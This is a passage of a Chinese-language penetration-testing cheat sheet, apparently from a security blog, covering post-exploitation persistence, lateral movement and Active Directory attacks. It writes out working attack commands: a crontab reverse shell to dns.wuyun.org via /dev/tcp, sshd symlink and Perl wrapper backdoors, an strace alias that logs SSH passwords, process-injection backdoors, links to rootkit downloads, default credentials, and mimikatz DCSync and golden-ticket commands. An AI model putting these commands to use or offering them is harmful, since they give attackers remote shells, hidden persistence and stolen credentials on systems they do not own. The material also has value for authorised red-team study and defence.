style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">New-ItemProperty &quot;HKCU:\\Environment\\&quot; UserInitMprLogonScript -value &quot;c:\\test\\11.bat&quot; -propertyType string | Out-Null</span></span></code></pre></div><h5 id=\"30、Password-Filter-DLL\"><a href=\"#30、Password-Filter-DLL\" class=\"headerlink\" title=\"30、Password Filter DLL\"></a>30、<a href=\"https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8\">Password Filter DLL</a></h5><h5 id=\"31、利用BHO实现IE浏览器劫持\"><a href=\"#31、利用BHO实现IE浏览器劫持\" class=\"headerlink\" title=\"31、利用BHO实现IE浏览器劫持\"></a>31、<a href=\"https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81\">利用BHO实现IE浏览器劫持</a></h5><h4 id=\"Linux-2\"><a href=\"#Linux-2\" class=\"headerlink\" title=\"Linux\"></a>Linux</h4><h5 id=\"crontab\"><a href=\"#crontab\" class=\"headerlink\" title=\"crontab\"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!bash</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -</span></span></code></pre></div><h5 id=\"硬链接sshd\"><a href=\"#硬链接sshd\" class=\"headerlink\" title=\"硬链接sshd\"></a>硬链接sshd</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!bash</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span></span></code></pre></div><p>链接：ssh <a href=\"mailto:&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#48;&#54;&#x2e;&#49;&#x34;&#x32;\">&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#48;&#54;&#x2e;&#49;&#x34;&#x32;</a> -p 2333</p>\n<h5 id=\"SSH-Server-wrapper\"><a href=\"#SSH-Server-wrapper\" class=\"headerlink\" title=\"SSH Server wrapper\"></a>SSH Server wrapper</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!bash</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cd /usr/sbin</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">mv sshd ../bin</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">echo &#39;#!/usr/bin/perl&#39; &gt;sshd</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">chmod u+x sshd</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">//不用重启也行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">/etc/init.d/sshd restart</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span></span></code></pre></div><h5 id=\"SSH-keylogger\"><a href=\"#SSH-keylogger\" class=\"headerlink\" title=\"SSH keylogger\"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!bash</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;</span></span></code></pre></div><p>source .bashrc</p>\n<h5 id=\"Cymothoa-进程注入backdoor\"><a href=\"#Cymothoa-进程注入backdoor\" class=\"headerlink\" title=\"Cymothoa_进程注入backdoor\"></a>Cymothoa_进程注入backdoor</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">./cymothoa -p 2270 -s 1 -y 7777</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">nc -vv ip 7777</span></span></code></pre></div><h5 id=\"rootkit\"><a href=\"#rootkit\" class=\"headerlink\" title=\"rootkit\"></a>rootkit</h5><ul>\n<li><a href=\"http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz\">openssh_rootkit</a></li>\n<li><a href=\"http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz\">Kbeast_rootkit </a></li>\n<li>Mafix + Suterusu rootkit</li>\n</ul>\n<h5 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h5><ul>\n<li><a href=\"https://github.com/Screetsec/Vegile\">Vegile </a></li>\n<li><a href=\"https://github.com/icco/backdoor\">backdoor </a></li>\n</ul>\n<h3 id=\"WEB后门\"><a href=\"#WEB后门\" class=\"headerlink\" title=\"WEB后门\"></a>WEB后门</h3><p>PHP Meterpreter后门<br>Aspx Meterpreter后门<br>weevely<br>webacoo<br>….</p>\n<h2 id=\"横向渗透\"><a href=\"#横向渗透\" class=\"headerlink\" title=\"横向渗透\"></a>横向渗透</h2><h3 id=\"端口渗透\"><a href=\"#端口渗透\" class=\"headerlink\" title=\"端口渗透\"></a>端口渗透</h3><h4 id=\"端口扫描-1\"><a href=\"#端口扫描-1\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><ul>\n<li>1.端口的指纹信息（版本信息） </li>\n<li>2.端口所对应运行的服务  </li>\n<li>3.常见的默认端口号  </li>\n<li>4.尝试弱口令</li>\n</ul>\n<h4 id=\"端口爆破\"><a href=\"#端口爆破\" class=\"headerlink\" title=\"端口爆破\"></a>端口爆破</h4><p><a href=\"https://github.com/vanhauser-thc/thc-hydra\">hydra </a></p>\n<h4 id=\"端口弱口令\"><a href=\"#端口弱口令\" class=\"headerlink\" title=\"端口弱口令\"></a>端口弱口令</h4><ul>\n<li>NTScan  </li>\n<li>Hscan  </li>\n<li>自写脚本</li>\n</ul>\n<h4 id=\"端口溢出\"><a href=\"#端口溢出\" class=\"headerlink\" title=\"端口溢出\"></a>端口溢出</h4><p><strong>smb</strong></p>\n<ul>\n<li>ms08067 </li>\n<li>ms17010 </li>\n<li>ms11058 </li>\n<li>…</li>\n</ul>\n<p><strong>apache</strong><br><strong>ftp</strong><br><strong>…</strong></p>\n<h4 id=\"常见的默认端口\"><a href=\"#常见的默认端口\" class=\"headerlink\" title=\"常见的默认端口\"></a>常见的默认端口</h4><h5 id=\"1、web类-web漏洞-敏感目录\"><a href=\"#1、web类-web漏洞-敏感目录\" class=\"headerlink\" title=\"1、web类(web漏洞&#x2F;敏感目录)\"></a>1、web类(web漏洞&#x2F;敏感目录)</h5><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">80 web </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">80-89 web </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8000-9090 web </span></span></code></pre></div><h5 id=\"2、数据库类-扫描弱口令\"><a href=\"#2、数据库类-扫描弱口令\" class=\"headerlink\" title=\"2、数据库类(扫描弱口令)\"></a>2、数据库类(扫描弱口令)</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">1433 MSSQL </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1521 Oracle </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3306 MySQL </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">5432 PostgreSQL </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50000 DB2</span></span></code></pre></div><h5 id=\"3、特殊服务类-未授权-命令执行类-漏洞\"><a href=\"#3、特殊服务类-未授权-命令执行类-漏洞\" class=\"headerlink\" title=\"3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)\"></a>3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">443 SSL心脏滴血 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">445 ms08067/ms11058/ms17010等 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">873 Rsync未授权 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">5984 CouchDB http://xxx:5984/_utils/ </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">6379 redis未授权 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">7001,7002 WebLogic默认弱口令，反序列 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">11211 memcache未授权访问 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">27017,27018 Mongodb未授权访问 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50000 SAP命令执行 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50070,50030 hadoop默认端口未授权访问 </span></span></code></pre></div><h5 id=\"4、常用端口类-扫描弱口令-端口爆破\"><a href=\"#4、常用端口类-扫描弱口令-端口爆破\" class=\"headerlink\" title=\"4、常用端口类(扫描弱口令&#x2F;端口爆破)\"></a>4、常用端口类(扫描弱口令&#x2F;端口爆破)</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">21 ftp </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">22 SSH </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">23 Telnet </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">445 SMB弱口令扫描 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">2601,2604 zebra路由，默认密码zebra </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3389 远程桌面 </span></span></code></pre></div><h5 id=\"5、端口合计所对应的服务\"><a href=\"#5、端口合计所对应的服务\" class=\"headerlink\" title=\"5、端口合计所对应的服务\"></a>5、端口合计所对应的服务</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">21 ftp </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">22 SSH </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">23 Telnet </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">25 SMTP </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">53 DNS </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">69 TFTP </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">80 web </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">80-89 web </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">110 POP3 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">135 RPC </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">139 NETBIOS </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">143 IMAP </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">161 SNMP </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">389 LDAP </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">443 SSL心脏滴血以及一些web漏洞测试 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">445 SMB </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">512,513,514 Rexec </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">873 Rsync未授权 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1025,111 NFS </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1080 socks </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1433 MSSQL (暴力破解) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">1521 Oracle:(iSqlPlus Port:5560,7778) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">2082/2083 cpanel主机管理系统登陆 （国外用较多） </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">2222 DA虚拟主机管理系统登陆 （国外用较多） </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">2601,2604 zebra路由，默认密码zebra </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3306 MySQL （暴力破解） </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3312/3311 kangle主机管理系统登陆 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3389 远程桌面 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">3690 svn </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">4848 GlassFish web中间件 弱口令:admin/adminadmin </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">5432 PostgreSQL </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">5900 vnc </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">5984 CouchDB http://xxx:5984/_utils/ </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">6379 redis未授权 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">7001,7002 WebLogic默认弱口令，反序列 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">7778 Kloxo主机控制面板登录 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8080 tomcat/WDCd/ 主机管理系统，默认弱口令 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8080,8089,9090 JBOSS </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8081 Symantec AV/Filter for MSE </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8083 Vestacp主机管理系统 （国外用较多） </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8649 ganglia </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">8888 amh/LuManager 主机管理系统默认端口 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">9000 fcgi fcig php执行 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">11211 memcache未授权访问 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">27017,27018 Mongodb未授权访问 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">28017 mongodb统计页面 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50000 SAP命令执行 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50060 hadoop </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">50070,50030 hadoop默认端口未授权访问</span></span></code></pre></div><h3 id=\"域渗透\"><a href=\"#域渗透\" class=\"headerlink\" title=\"域渗透\"></a>域渗透</h3><h4 id=\"信息搜集-1\"><a href=\"#信息搜集-1\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h4><h5 id=\"powerview-ps1\"><a href=\"#powerview-ps1\" class=\"headerlink\" title=\"powerview.ps1\"></a>powerview.ps1</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">Get-NetDomain - gets the name of the current user&#39;s domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetForest - gets the forest associated with the current user&#39;s domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetForestDomains - gets all domains for the current forest</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetDomainControllers - gets the domain controllers for the current computer&#39;s domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetCurrentUser - gets the current [domain\\]username</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetUserSPNs - gets all user ServicePrincipalNames</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetOUs - gets data for domain organization units</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetGUIDOUs - finds domain OUs linked to a specific GUID</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Invoke-NetUserAdd - adds a local or domain user</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetGroups - gets a list of all current groups in the domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetGroup - gets data for each user in a specified domain group</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Invoke-NetGroupUserAdd - adds a user to a specified local or domain group</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetComputers - gets a list of all current servers in the domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetFileServers - get a list of file servers used by current domain users</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetShare - gets share information for a specified server</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetLoggedon - gets users actively logged onto a specified server</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetSessions - gets active sessions on a specified server</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetConnections - gets active connections to a specific server resource (share)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetFiles - gets open files on a server</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Get-NetProcesses - gets the remote processes and owners on a remote server</span></span></code></pre></div><p>PowerView-2.0-tricks:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">https://gist.github.com/HarmJ0y/3328d954607d71362e3c</span></span></code></pre></div><p>PowerView-3.0-tricks</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</span></span></code></pre></div><h5 id=\"BloodHound\"><a href=\"#BloodHound\" class=\"headerlink\" title=\"BloodHound\"></a>BloodHound</h5><p><strong>获取某OU下所有机器信息</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            &quot;name&quot;: &quot;Find the specificed OU computers&quot;,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            &quot;queryList&quot;: [</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                &#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;final&quot;: false,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;title&quot;: &quot;Select a OU...&quot;,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;query&quot;: &quot;MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                &#125;,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                &#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;final&quot;: true,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;query&quot;: &quot;MATCH (m:OU  &#123;name: $result&#125;) with m MATCH p=(o:OU &#123;objectid: m.objectid&#125;)-[r:Contains*1..]-&gt;(n:Computer) RETURN p&quot;,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;allowCollapse&quot;: true,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                    &quot;endNode&quot;: &quot;&#123;&#125;&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            ]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        &#125;</span></span></code></pre></div><p><strong>自动标记owned用户及机器</strong></p>\n<p><a href=\"https://github.com/Lz1y/SyncDog\">SyncDog</a></p>\n<h5 id=\"获取域内DNS信息\"><a href=\"#获取域内DNS信息\" class=\"headerlink\" title=\"获取域内DNS信息\"></a>获取域内DNS信息</h5><ul>\n<li><a href=\"https://github.com/dirkjanm/adidnsdump\">adidnsdump</a></li>\n<li><a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96\">域渗透——DNS记录的获取</a><br>​</li>\n</ul>\n<h4 id=\"获取域控的方法\"><a href=\"#获取域控的方法\" class=\"headerlink\" title=\"获取域控的方法\"></a>获取域控的方法</h4><h5 id=\"SYSVOL\"><a href=\"#SYSVOL\" class=\"headerlink\" title=\"SYSVOL\"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。<br>相关阅读: </p>\n<ul>\n<li><a href=\"https://www.secpulse.com/archives/42175.html\">寻找SYSVOL里的密码和攻击GPP（组策略偏好） </a></li>\n<li><a href=\"http://blog.51cto.com/ycrsjxy/203095\">Windows Server 2008 R2之四管理Sysvol文件夹 </a></li>\n<li><a href=\"https://adsecurity.org/?p=2288\">SYSVOL中查找密码并利用组策略首选项 </a></li>\n<li><a href=\"https://xz.aliyun.com/t/1653\">利用SYSVOL还原组策略中保存的密码</a></li>\n</ul>\n<h5 id=\"MS14-068-Kerberos\"><a href=\"#MS14-068-Kerberos\" class=\"headerlink\" title=\"MS14-068 Kerberos\"></a>MS14-068 Kerberos</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span></span></code></pre></div><p>利用mimikatz将工具得到的<a href=\"mailto:&#x54;&#71;&#84;&#95;&#100;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x75;&#115;&#101;&#x72;&#64;&#83;&#x45;&#x52;&#x56;&#69;&#82;&#x2e;&#67;&#79;&#x4d;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;\">&#x54;&#71;&#84;&#95;&#100;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x75;&#115;&#101;&#x72;&#64;&#83;&#x45;&#x52;&#x56;&#69;&#82;&#x2e;&#67;&#79;&#x4d;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;</a>写入内存，创建缓存证书：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net use k: \\pentest.comc$</span></span></code></pre></div><p>相关阅读 :</p>\n<ul>\n<li><a href=\"http://adsecurity.org/?p=676\">Kerberos的工具包PyKEK</a> </li>\n<li><a href=\"http://www.freebuf.com/vuls/56081.html\">深入解读MS14-068漏洞</a></li>\n<li><a href=\"https://adsecurity.org/?p=541\">Kerberos的安全漏洞</a></li>\n</ul>\n<h5 id=\"SPN扫描\"><a href=\"#SPN扫描\" class=\"headerlink\" title=\"SPN扫描\"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。<br>相关阅读 :</p>\n<ul>\n<li><a href=\"https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/\">非扫描式的SQL Server发现</a> </li>\n<li><a href=\"https://adsecurity.org/?p=1508\">SPN扫描</a> </li>\n<li><a href=\"https://github.com/PyroTek3/PowerShell-AD-Recon\">扫描SQLServer的脚本</a></li>\n</ul>\n<h5 id=\"Kerberos的黄金门票\"><a href=\"#Kerberos的黄金门票\" class=\"headerlink\" title=\"Kerberos的黄金门票\"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lsadump::dcsync /domain:pentest.com /user:krbtgt</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">kerberos::purge</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi</span></span>\n<span class=\"line\"><span style=\"color: 